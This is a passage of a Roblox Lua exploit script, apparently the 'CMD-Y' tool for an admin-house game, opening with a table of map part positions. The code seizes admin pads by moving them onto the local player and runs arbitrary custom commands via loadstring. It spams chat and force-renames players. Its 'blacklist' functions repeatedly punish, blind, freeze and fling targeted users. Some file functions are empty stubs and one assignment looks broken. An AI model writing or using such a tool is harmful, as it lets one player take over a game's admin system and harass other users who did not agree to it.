			["SmoothBlockModel190"] = {-30.0650005, 33.4300003, 99.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel107"] = {-57.0650024, 21.4300003, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel96"] = {-33.0650024, 35.8300018, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel149"] = {-30.0650005, 37.0300026, 78.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel158"] = {-30.0650005, 38.2300034, 84.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["SmoothBlockModel215"] = {-47.0650024, 27.4300022, 99.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel212"] = {-44.5650024, 10.0300007, 99.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel169"] = {-53.0650024, 23.8300018, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel172"] = {-45.0650024, 28.6300011, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel199"] = {-15.5650005, 10.0300007, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel182"] = {-38.5650024, 13.6300011, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel121"] = {-2.56500006, 7.03000021, 83.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel92"] = {-53.0650024, 23.8300018, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel170"] = {-37.0650024, 33.4300003, 84.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel192"] = {-19.0650005, 15.4300003, 99.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["Spawn1"] = {-29, 0.0999880284, -25.5900097, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["Spawn2"] = {-53, 0.0999999493, -25.5900097, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["Spawn3"] = {-41, 0.0999999493, -25.5899963, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["Regen"] = {-7.16499996, 5.42998981, 94.7429962, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Baseplate"] = {0, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Jump"] = {-41.0650024, 1.30000007, -5.95700026, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump1"] = {-41.0650024, 1.30000007, 0.243000016, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump2"] = {-41.0650024, 1.30000007, -11.9570007, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump3"] = {-41.0650024, 1.30000007, 11.0430002, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump4"] = {-41.0650024, 1.30000007, 16.0430012, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump5"] = {-41.0650024, 1.30000007, 6.24300051, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump6"] = {-41.0650024, 1.30000007, 21.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump7"] = {-41.0650024, 1.30000007, 26.4430008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump8"] = {-41.0650024, 1.30000007, 31.2430019, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Jump9"] = {-41.0650024, 1.30000007, -17.757, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Left Wall"] = {-23.0650024, 16.5000019, 0.243000031, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Right Wall"] = {-59.0650101, 16.5000038, 0.243000031, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Ceiling Wall"] = {-41.0649872, 31.6999989, 1.24301004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Back Wall"] = {-41.0649948, 16.5000076, -30.757, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["Pad8"] = {-40.7649879, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Pad7"] = {-36.7649803, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Pad6"] = {-32.7649765, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Pad3"] = {-20.7649632, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Pad9"] = {-44.7649994, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Pad1"] = {-12.7649641, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Pad5"] = {-28.7649689, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Pad2"] = {-16.7649612, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Pad4"] = {-24.764967, 5.42999983, 94.3430023, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["SmoothBlockModel40"] = {-30.0650005, 1.03000009, 72.2430038, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel38"] = {-30.0650005, 2.83000016, 72.2430038, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["SmoothBlockModel112"] = {-30.0650005, 4.63000011, 72.2430038, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider1"] = {-10.7649708, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider2"] = {-14.7649689, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider3"] = {-18.7649689, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider4"] = {-22.7649727, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider5"] = {-26.7649746, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider6"] = {-30.7649822, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider7"] = {-34.7649841, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider8"] = {-38.7649918, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider9"] = {-42.7650032, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Divider10"] = {-46.7649994, 6.42999983, 93.8430023, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Back"] = {-28.7649994, 6.42999983, 96.3430023, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["SmoothBlockModel85"] = {-3.06500006, 9.43000031, 72.2430038, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part57"] = {-101.076004, 1.20200002, 13.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part55"] = {-101.076004, 1.70000005, 17.4740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part54"] = {-97.576004, 0.900000036, 17.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part53"] = {-95.0770035, 0.90200007, 7.47400045, 1, 0, 0, 0, -1, 0, 0, 0, -1},
			["Part52"] = {-95.076004, 1.20200002, 10.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part50"] = {-89.576004, 1.20000005, 17.9740009, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Part47"] = {-93.576004, 1.20000005, 17.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part49"] = {-85.576004, 1.20000005, 17.9740009, 0, 0, 1, 0, -1, 0, 1, 0, -0},
			["Part46"] = {-93.576004, 1.20000005, 13.9740009, 0, 0, 1, 0, 1, -0, -1, 0, 0},
			["Part44"] = {-74.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part43"] = {-78.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part40"] = {-85.576004, 1.20000005, 13.9740009, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["Part60"] = {-101.076004, 0.90200007, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
			["Part36"] = {-89.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part56"] = {-101.076004, 0.90200007, 10.4760008, 1, 0, 0, 0, -1, 0, 0, 0, -1},
			["Part35"] = {-86.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
			["Part33"] = {-77.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part32"] = {-83.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part41"] = {-89.576004, 0.900000036, 13.9740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part31"] = {-77.076004, 2.70000005, 7.47400045, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part27"] = {-72.6300049, 2.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part42"] = {-89.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
			["Part26"] = {-72.6300049, 6.10000038, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part30"] = {-83.0780029, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
			["Part39"] = {-86.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part25"] = {-72.6300049, 3.70000029, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part24"] = {-72.6300049, 7.30000019, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part34"] = {-80.0770035, 1.20200002, 10.4740009, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part21"] = {-68.0300064, 8.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part22"] = {-72.6300049, 1.30000007, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part58"] = {-98.076004, 0.90200007, 10.4760008, 1, 0, 0, 0, -1, 0, 0, 0, -1},
			["Part17"] = {-68.0300064, 6.10000038, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part19"] = {-68.0300064, 2.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part20"] = {-68.0300064, 4.9000001, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part23"] = {-72.6300049, 8.5, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part15"] = {-68.0300064, 7.30000019, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part13"] = {-67.5, 8.5, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part12"] = {-67.5, 7.30000019, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part48"] = {-92.0770035, 1.20200002, 10.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part8"] = {-67.5, 4.9000001, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part59"] = {-98.076004, 1.20200002, 13.4760008, 0, 0, -1, 0, 1, 0, 1, 0, 0},
			["Part10"] = {-67.5, 1.30000007, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part7"] = {-69, 8.5, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part28"] = {-72.6300049, 4.9000001, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part6"] = {-69, 7.30000019, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part9"] = {-67.5, 6.10000038, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part5"] = {-69, 6.0999999, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part16"] = {-68.0300064, 1.30000007, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part18"] = {-68.0300064, 3.70000029, 6.8300004, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part11"] = {-67.5, 3.70000029, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part4"] = {-69, 4.9000001, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part3"] = {-69, 3.70000005, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part2"] = {-69, 2.5, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part1"] = {-69, 1.30000007, 12, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part37"] = {-76.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part14"] = {-67.5, 2.5, 8.95000076, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part45"] = {-82.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part38"] = {-80.576004, 1.30000007, 14.9740009, 1, 0, 0, 0, 1, 0, 0, 0, 1},
			["Part29"] = {-80.076004, 0.900000036, 7.47400045, -1, 0, 0, 0, 1, 0, 0, 0, -1},
			["Part61"] = {-98.0770035, 0.90200007, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1},
			["Part51"] = {-92.0770035, 0.900000036, 7.47600031, 1, 0, 0, 0, -1, 0, 0, 0, -1}
		}



		local CurrentPlayer = ""

		local Mouse = Player:GetMouse()
		local prefix = SettingsP.Prefix.Text



		CMDY.SilentLogsBar.CloseLogs.MouseButton1Click:Connect(function()
			CMDY.SilentLogsBar.Visible = false
		end)

		local function writefile()

		end

		local function isfile()

		end

		local function readfile()
		end

		local function checkfiles()

		end

		CMDY.HouseBind.FocusLost:Connect(function()
			if isfile("cmdysettings.json") then
				local g = game:GetService("HttpService"):JSONDecode(readfile("cmdysettings.json"))
				g["HouseBind"] = CMDY.HouseBind.Text
				writefile("cmdysettings.json", game:GetService("HttpService"):JSONEncode(g))
			else
				checkfiles()
			end
		end)

		CMDY.RegenPadBind.FocusLost:Connect(function()
			if isfile("cmdysettings.json") then
				local g = game:GetService("HttpService"):JSONDecode(readfile("cmdysettings.json"))
				g["RegenPadBind"] = CMDY.RegenPadBind.Text
				writefile("cmdysettings.json", game:GetService("HttpService"):JSONEncode(g))
			else
				checkfiles()
			end
		end)

		CMDY.SpawnBind.FocusLost:Connect(function()
			if isfile("cmdysettings.json") then
				local g = game:GetService("HttpService"):JSONDecode(readfile("cmdysettings.json"))
				g["SpawnBind"] = CMDY.SpawnBind.Text
				writefile("cmdysettings.json", game:GetService("HttpService"):JSONEncode(g))
			else
				checkfiles()
			end
		end)


		CMDY.AdminPadsBind.FocusLost:Connect(function()
			if isfile("cmdysettings.json") then
				local g = game:GetService("HttpService"):JSONDecode(readfile("cmdysettings.json"))
				g["AdminPadsBind"] = CMDY.AdminPadsBind.Text
				writefile("cmdysettings.json", game:GetService("HttpService"):JSONEncode(g))
			else
				checkfiles()
			end
		end)


		SettingsP.Prefix.FocusLost:Connect(function()
			SettingsP.Prefix.PlaceholderText = ";"
			if isfile("cmdysettings.json") then
				local g = game:GetService("HttpService"):JSONDecode(readfile("cmdysettings.json"))
				g["Prefix"] = SettingsP.Prefix.Text
				writefile("cmdysettings.json", game:GetService("HttpService"):JSONEncode(g))
			else
				checkfiles()
				local p = SettingsP.Prefix.Text
				if p == nil or p == "" or p == " " then
					prefix = SettingsP.Prefix.PlaceholderText
				else
					prefix = p
				end
			end
		end)

		SettingsP.Prefix.Focused:Connect(function()
			SettingsP.Prefix.PlaceholderText = ".."
		end)

		local function prompt(text)
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "CMD-Y";
				Text = text;
				Icon = "rbxassetid://11498630689";
				Duration = 3;
			})
		end

		_G.Chat = function(msg)
			act(msg)
		end

		_G.newcmdadd = function(cmdname, func)
			local newc = CMDY.EditableCommand:Clone()
			local news = CMDY.CodeForCMD:Clone()
			local newn = CMDY.NameOfCMD:Clone()

			newn.Name = "NameOfCMD"
			news.Name = "CodeForCMD"
			news.Parent = newc
			newn.Parent = newc

			newc.CodeForCMD.Value = func
			newc.NameOfCMD.Value = cmdname
			table.insert(cmds.cmdnames, cmdname)

			newc.Visible = true
			newc.Parent = CommandsP.ScrollingFrame

			newc.Text = "[CUSTOM] " .. cmdname

			newc.EDITCMD.MouseButton1Click:Connect(function()
				Tabs.Drop.BackgroundTransparency = 1
				Tabs.Drop.EditCommand.BackgroundTransparency = 1
				Tabs.Drop.Visible = true
				Tabs.Drop.EditCommand.Visible = true
				TS:Create(Tabs.Drop, TweenInfo.new(.4), {BackgroundTransparency = 0.15}):Play()
				TS:Create(Tabs.Drop.EditCommand, TweenInfo.new(.4), {BackgroundTransparency = 0}):Play()

				Tabs.Drop.EditCommand.closebbb2.MouseButton1Click:Connect(function()
					Tabs.Drop.Visible = false
					Tabs.Drop.EditCommand.Visible = false
				end)

				Tabs.Drop.EditCommand.EditBox.Text = func

				Tabs.Drop.EditCommand.Update.MouseButton1Click:Connect(function()
					func = Tabs.Drop.EditCommand.EditBox.Text
					Tabs.Drop.Visible = false
					Tabs.Drop.EditCommand.Visible = false
				end)
			end)

			Player.Chatted:Connect(function(msg)
				local newmsg = string.lower(msg)
				local args = newmsg:split(" ")
				if args[1] == prefix .. cmdname then
					local s,err = pcall(function()
						assert(loadstring(func))()
					end)
					if not s then
						print("Error with " .. cmdname .. ": " .. err)
					end
				end
			end)
		end



		local function act(ch)
			workspace.ChatWindow_MessagePosted:fire(ch)
		end

		local function Toggle(toggle, o)
			if o == 1 then
				TS:Create(toggle.Toggle, TweenInfo.new(.25, Enum.EasingStyle.Sine), {BackgroundColor3 = Color3.new(0.556863, 1, 0.52549)}):Play()
				toggle.Toggle:TweenPosition(UDim2.new(0.622,0,0,0), Enum.EasingDirection.Out,Enum.EasingStyle.Sine, 0.25, true)
			elseif o == 2 then
				toggle.Toggle:TweenPosition(UDim2.new(0,0,0,0), Enum.EasingDirection.Out,Enum.EasingStyle.Sine, 0.25, true)
				TS:Create(toggle.Toggle, TweenInfo.new(.25, Enum.EasingStyle.Sine), {BackgroundColor3 = Color3.new(1, 0.431373, 0.431373)}):Play()
			end
		end



		local function settheme(R,G,B, C)
			if C == true then
				for _,v in pairs(game.Players.LocalPlayer.PlayerGui["CMD-Y"]:GetDescendants()) do
					if v.Name == "GuiTheme" and v.Parent.Name == "SettingsP" then
						v.BackgroundColor3 = Color3.new(255,255,255)
					elseif v.Name == "TabsContainer" then 
						v.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
					elseif v.Parent.Name == "HomeP" and v:IsA("Frame") then
						v.BackgroundColor3 = Color3.fromRGB(131, 131, 131)
					elseif v.Name == "Container" then
						v.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
					elseif v.Name == "TopBar" then
						v.BackgroundColor3 = Color3.fromRGB(66, 66, 66)
					elseif v.Parent.Name == "TabsContainer" and v:IsA("Frame") then
						v.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("TextLabel") then
						v.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("TextButton") then
						v.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
					elseif v.Parent.Parent.Parent.Name == "TabsContainer" and v.Name == "ColorFrame" then
						continue
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("Frame") then
						v.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("TextBox") then
						v.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("ScrollingFrame") then
						v.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
					elseif v.Parent:IsA("ScrollingFrame") and v:IsA("TextLabel") then
						v.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
					end
				end
			else
				for _,v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
					if v.Name == "GuiTheme" and v.Parent.Name == "SettingsP" then
						v.BackgroundColor3 = Color3.new(Tabs.Drop.ThemeColorPickerMenu.Preview.BackgroundColor3.R, Tabs.Drop.ThemeColorPickerMenu.Preview.BackgroundColor3.G, Tabs.Drop.ThemeColorPickerMenu.Preview.BackgroundColor3.B)
					elseif v.Name == "TabsContainer" then 
						v.BackgroundColor3 = Color3.new(R/3, G/3, B/3)
					elseif v.Name == "Container" then
						v.BackgroundColor3 = Color3.new(R/4, G/4, B/4)
					elseif v.Name == "TopBar" then
						v.BackgroundColor3 = Color3.new(R/2.5 * 1.3, G/2.5 * 1.3, B/2.5 * 1.3)
					elseif v.Parent.Name == "TabsContainer" and v:IsA("Frame") then
						v.BackgroundColor3 = Color3.new(R/4, G/4, B/4)
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("TextLabel") then
						v.BackgroundColor3 = Color3.new(R/3, G/3, B/3)
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("TextButton") then
						v.BackgroundColor3 = Color3.new(R/3, G/3, B/3)
					elseif v.Parent.Parent.Parent.Name == "TabsContainer" and v.Name == "ColorFrame" then
						continue
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("Frame") then
						v.BackgroundColor3 = Color3.new(R/4, G/4, B/4)
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("TextBox") then
						v.BackgroundColor3 = Color3.new(R/3, G/3, B/3)
					elseif v.Parent.Parent.Name == "TabsContainer" and v:IsA("ScrollingFrame") then
						v.BackgroundColor3 = Color3.new(R/4, G/4, B/4)
					elseif v.Parent:IsA("ScrollingFrame") and v:IsA("TextLabel") then
						v.BackgroundColor3 = Color3.new(R/3, G/3, B/3)
					end
				end
			end
		end




		local function addcmd(cmdname, alias, cmddesc, func)
			table.insert(cmds.cmdnames, cmdname)
			table.insert(cmds.aliases, alias)

			local newcmd = CommandsP.ScrollingFrame.Command:Clone()

			if alias == nil then
				newcmd.Text = cmdname .. " - " .. cmddesc
			else
				newcmd.Text = cmdname .. "/" .. alias .. " - " .. cmddesc
			end

			newcmd.Visible = true
			newcmd.Parent = CommandsP.ScrollingFrame

			Player.Chatted:Connect(function(msg)
				local newmsg = string.lower(msg)
				local args = newmsg:split(" ")
				if args[1] == prefix .. cmdname then 
					if args[2] == nil then
						func()
					else	
						func(newmsg:gsub(prefix .. cmdname .. " ", ""))
					end
				end
				if alias ~= nil then
					if args[1] == prefix .. alias then
						if args[2] == nil then
							func()
						else	
							func(newmsg:gsub(prefix .. alias .. " ", ""))
						end
					end
				end
			end)
		end

		local function regen()
			if Admin:FindFirstChild("Regen") then

				return true
			else
				return false
			end
		end


		local function fwait()
			game:GetService("RunService").Heartbeat:Wait()
		end

		local function bypassattemptcheck(plr)
			if string.sub(string.lower(plr), 1,3) == "me_" then
				return true, "m"
			elseif string.sub(string.lower(plr), 1,4) == "all_" then
				return true, "al"
			elseif string.sub(string.lower(plr), 1,7) == "others_" then
				return true, "other"	
			elseif string.sub(string.lower(plr), 1,8) == "friends_" then
				return true, "frien"
			elseif string.sub(string.lower(plr), 1,7) == "admins_" then
				return true, "admi"
			elseif string.sub(string.lower(plr), 1,10) == "nonadmins_" then
				return true, "nonadmi"
			elseif string.sub(string.lower(plr), 1,7) == "random_" then
				return true, "rando"
			end
		end

		local function spam(msg)
			if not msg then return end
			spamming = true
			while true do
				fwait()
				act(msg)
				if spamming == false then break end
			end
		end

		local function rname(plr)
			rnamel = true
			while rnamel do
				task.wait(.12)
				act("name " .. plr .. " " .. words[math.random(1, #words)])
			end
		end

		local function servermsg(msg)
			if not msg then return end
			act("h \n\n\n " .. msg .. " \n\n\n")
		end

		local function removewelds()
			for _,v in pairs(workspace:GetChildren()) do
				if PlayerService:FindFirstChild(v.Name) and v.Name ~= Player.Name and not v:FindFirstChild("Addon") then
					if v:FindFirstChild("Torso") and v.Torso:FindFirstChild("Weld") then
						repeat fwait() until v.Torso:FindFirstChild("Weld").Part1 ~= nil
						if v.Torso:FindFirstChild("Weld").Part1 ~= "Addon" then
							local isBypass,st = bypassattemptcheck(v.Name)
							if isBypass then
								act("removetools " .. st)
								act("reload " .. st)
								regen()
								act("freeze " .. st)
								if showsm then
									act("name " .. st .. " [ CMD-Y ] AntiAttach is on!")
								end
							else
								act("removetools " .. v.Name)
								act("reload " .. v.Name)
								regen()
								act("freeze " .. v.Name)
								if showsm then
									act("name " .. v.Name .. " [ CMD-Y ] AntiAttach is on!")
								end
							end
						end
					end
				end
			end
		end

		local function bl(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local isBypass,st = bypassattemptcheck(v.Name)
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname and not table.find(blacklist, v.Name) and v.Name ~= PlayerService.LocalPlayer.Name and not table.find(UntouchedPlayers, v.UserId) then
					if isBypass then
						table.insert(blacklist, v.Name)
						regen()
						act("punish others")
						act("noclip others")
						act("speed others inf")
						act("setgrav others inf")
						act("blind others")
						for i = 1,10 do
							act("skydive others")
						end
						for _,v in pairs(PlayerService:GetPlayers()) do
							if not table.find(blacklist, v.Name) then
								act("respawn " .. v.Name)
							end
						end
						if showsm then
							servermsg("[ CMD-Y ] User with bypass name " .. v.Name .. " was blacklisted. Sorry about the refresh!")
						else
							prompt("[ CMD-Y ] User with bypass name " .. v.Name .. " was blacklisted. Sorry about the refresh!")
						end
					else
						table.insert(blacklist, v.Name)
						if showsm then
							servermsg("[ CMD-Y ] " .. v.Name .. " was just blacklisted. Sucks to be them.")
						else
							prompt("[ CMD-Y ] " .. v.Name .. " was just blacklisted. Sucks to be them.")
						end
						act("punish " .. v.Name)
						regen()
						act("noclip " .. v.Name)
						act("speed " .. v.Name .. " inf")
						act("setgrav " .. v.Name .. " inf")
						act("blind " .. v.Name)
						for i = 1,10 do
							act("skydive " .. v.Name)
						end
					end
				end
			end
		end

		local task__ = task
		local task__wait = task__.wait

		local function task_wait()

			return task__.wait()
		end

		local function touchpad(pad)
			if pad:FindFirstChildOfClass("Part") and PlayerService.LocalPlayer.Character ~= nil and PlayerService.LocalPlayer.Character.HumanoidRootPart ~= nil then
				local oldCF = pad.Head.CFrame
				pad.Head.CFrame = PlayerService.LocalPlayer.Character.HumanoidRootPart
				task_wait(.05)
				pad.Head.CFrame = oldCF
			end
		end

		local function unbl(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local isBypass,st = bypassattemptcheck(v.Name)
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname and table.find(blacklist, v.Name) then
					if isBypass == true then
						if showsm then
							servermsg("[ CMD-Y ] " .. v.Name .. " was just unblacklisted. You can come out of timeout now.")
						else
							prompt("[ CMD-Y ] " .. v.Name .. " was just unblacklisted. You can come out of timeout now.")
						end

						act("respawn others")
						table.remove(blacklist, table.find(blacklist, v.Name))
					else
						if showsm then
							servermsg("[ CMD-Y ] " .. v.Name .. " was just unblacklisted. You can come out of timeout now.")
						else
							prompt("[ CMD-Y ] " .. v.Name .. " was just unblacklisted. You can come out of timeout now.")
						end
						act("respawn " .. v.Name)
						table.remove(blacklist, table.find(blacklist, v.Name))
					end
				end
			end
		end

		local function wl(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local isBypass,st = bypassattemptcheck(v.Name)
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname and not table.find(whitelist, v.Name) and v.Name ~= PlayerService.LocalPlayer.Name then
					if isBypass then
						if showsm then
							servermsg("[ CMD-Y ] Bypass name " .. v.Name .. " was just whitelisted. \nPlease be aware if another bypassed username joins, " .. v.Name .. " will be automatically unwhitelisted.")
						else
							prompt("[ CMD-Y ] Bypass name " .. v.Name .. " was just whitelisted. \nPlease be aware if another bypassed username joins, " .. v.Name .. " will be automatically unwhitelisted.")
						end
						table.insert(whitelist, v.Name)
					else
						if showsm then
							servermsg("[ CMD-Y ] " .. v.Name .. " was just whitelisted.")
						else
							prompt("[ CMD-Y ] " .. v.Name .. " was just whitelisted.")
						end
						table.insert(whitelist, v.Name)
					end
				end
			end

		end

		local function pbl(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname and not table.find(permblacklist, v.Name) and v.Name ~= PlayerService.LocalPlayer.Name then
					if showsm then
						servermsg("[ CMD-Y ] " .. v.Name .. " was just blacklisted from perm. Now what are you gonna do?")
					else
						prompt("[ CMD-Y ] " .. v.Name .. " was just blacklisted from perm. Now what are you gonna do?")
					end
					table.insert(permblacklist, v.Name)
				end
			end
		end

		local function unpbl(plr)
			for _,v in pairs(PlayerService:GetPlayers()) do
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname and table.find(permblacklist, v.Name) and v.Name ~= PlayerService.LocalPlayer.Name then
					if showsm then
						servermsg("[ CMD-Y ] " .. v.Name .. " was just unblacklisted from perm. Happy admining..?")
					else
						prompt("[ CMD-Y ] " .. v.Name .. " was just unblacklisted from perm. Happy admining..?")
					end
